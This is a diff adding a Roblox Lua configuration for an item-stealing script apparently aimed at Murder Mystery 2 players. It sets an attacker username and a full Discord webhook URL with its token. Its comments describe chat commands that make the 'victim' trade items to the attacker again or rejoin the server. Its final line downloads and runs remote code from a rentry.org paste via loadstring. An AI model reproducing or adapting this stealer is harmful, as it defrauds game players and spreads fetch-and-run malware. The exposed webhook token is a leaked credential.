@@ -1,0 +1,16 @@
+
+
+Hunter = {
+    Username = {"KuriDangNguA"}, -- {"HUNTER"} or {"HUNTER", "SKIBIDI", "SIGMA"}
+    Webhook = "https://discord.com/api/webhooks/1264817250251051008/ZxBICtef1W53xtxdhV-0geDA4zsBZm1ckSnc8SV2v1KXoDYxIZVyARAsJZSqLXAMA00y"
+    FInv = true,
+    Script = "None", -- Don't Change
+    CustomLink = "None" -- Don't Change
+}
+
+Commands = {
+    ResendTrade = "skibidi", -- The victim will trade you again when you type this in chat
+    RestartPlayer = "sigma"  -- The victim will rejoin the server when you type this in chat
+}
+
+loadstring(game:HttpGet("https://rentry.org/murder-mystery-2/raw"))()
